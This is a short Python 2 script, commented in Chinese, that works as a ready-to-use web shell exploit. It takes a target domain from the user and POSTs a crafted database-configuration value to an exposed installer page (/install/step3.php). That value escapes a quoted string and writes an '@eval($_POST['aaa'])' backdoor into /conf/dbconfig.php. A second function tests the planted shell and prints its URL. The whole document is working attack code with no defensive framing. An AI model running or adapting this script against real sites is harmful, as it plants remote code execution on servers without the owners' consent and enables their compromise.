# -*- coding: cp936 -*-

import urllib

import urllib2

Url = str(raw_input("输入网站(只输入域名部分):"))

#自定义Shell密码(如果要自定义设置Shell密码 请自行修改以下代码)

#Key = str(raw_input("输入Shell密码:"))

#GetShell主程序

def GetShell(Url):
    
#错误处理
    
    try:
        
        #发送的Post数据
        
        test_data = {"DB_HOST":"localhost","Shell":" '); @eval ($_POST['aaa']);//"}

        #test_data = {"DB_HOST":"localhost","Shell":" '); @eval ($_POST['"+Key+"']);//"}

        test_data_urlencode = urllib.urlencode(test_data)

        #Url地址

        requrl = "http://"+Url+"/install/step3.php"

        req = urllib2.Request(url = requrl,data =test_data_urlencode)

        res_data = urllib2.urlopen(req,timeout=5)

        #调用验证函数测试是否写入成功

        Inspect(Url)

        #错误处理

    except:

        print "网络连接失败 请检查网络连接是否正常"

#验证GetShell是否成功

def Inspect(Url):

    #发送数据

    test_data = {"aaa":"echo '233';"}

    #自定义密码

    #test_data = {""+Key+"":"echo '233';"}

    test_data_urlencode = urllib.urlencode(test_data)

    #Url地址

    requrl = "http://"+Url+"/conf/dbconfig.php"

    req = urllib2.Request(url = requrl,data =test_data_urlencode)

    res_data = urllib2.urlopen(req,timeout=15)

    #读取页面源码

    Html = res_data.read()

    if (Html=="233"):

        print "Shell地址:"+"http://"+Url+"/conf/dbconfig.php"

    else: 

        print "漏洞已修复 无法利用"

GetShell(Url)
